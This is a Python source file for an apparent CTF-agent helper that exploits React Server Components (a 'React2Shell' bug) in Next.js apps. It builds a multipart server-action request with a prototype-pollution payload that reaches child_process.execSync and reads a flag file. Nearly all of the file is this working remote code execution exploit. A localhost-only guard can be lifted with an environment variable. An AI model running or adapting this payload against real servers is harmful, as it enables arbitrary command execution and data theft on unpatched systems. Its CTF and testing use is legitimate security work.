from __future__ import annotations

import json
import os
from dataclasses import dataclass
from urllib.parse import urlparse

import requests

from core.utils.flag_utils import find_first_flag


@dataclass(frozen=True)
class React2ShellResult:
    url: str
    status_code: int
    flag: str | None
    response_preview: str


class React2ShellTool:
    """
    React2Shell/RSC CTF helper.

    Localhost targets are allowed by default for downloaded Docker CTF bundles.
    Remote targets require CTF_AGENTS_ALLOW_REMOTE_R2S=1 so the user has to
    explicitly opt in for authorized spawned challenge services.
    """

    def run(self, url: str, *, file_path: str = "/app/flag.txt", timeout_s: int = 15) -> React2ShellResult:
        self._require_local_target(url)
        target = url.rstrip("/") + "/"
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
        body = self._build_body(boundary, file_path)

        response = requests.post(
            target,
            data=body.encode("utf-8"),
            headers={
                "Next-Action": "x",
                "X-Nextjs-Request-Id": "b5dce965",
                "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": "CTF_Agents local ReactOOPS verifier",
            },
            timeout=timeout_s,
        )

        text = response.text or ""
        return React2ShellResult(
            url=target,
            status_code=response.status_code,
            flag=find_first_flag(text),
            response_preview=text[:2000],
        )

    @staticmethod
    def _require_local_target(url: str) -> None:
        host = urlparse(url).hostname
        if host in {"127.0.0.1", "localhost", "::1"}:
            return
        if os.getenv("CTF_AGENTS_ALLOW_REMOTE_R2S") == "1":
            return
        raise PermissionError(
            "React2ShellTool only runs against localhost targets by default. "
            "Set CTF_AGENTS_ALLOW_REMOTE_R2S=1 for an authorized remote CTF target."
        )

    @staticmethod
    def _build_body(boundary: str, file_path: str) -> str:
        js = (
            "var res=process.mainModule.require('child_process')"
            f".execSync('cat {file_path}',{{'timeout':5000}}).toString().trim();;"
            "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
        )
        field0 = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": "{\"then\":\"$B1337\"}",
            "_response": {
                "_prefix": js,
                "_chunks": "$Q2",
                "_formData": {
                    "get": "$1:constructor:constructor",
                },
            },
        }

        return (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{json.dumps(field0, separators=(',', ':'))}\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="1"\r\n\r\n'
            '"$@0"\r\n'
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="2"\r\n\r\n'
            "[]\r\n"
            f"--{boundary}--\r\n"
        )
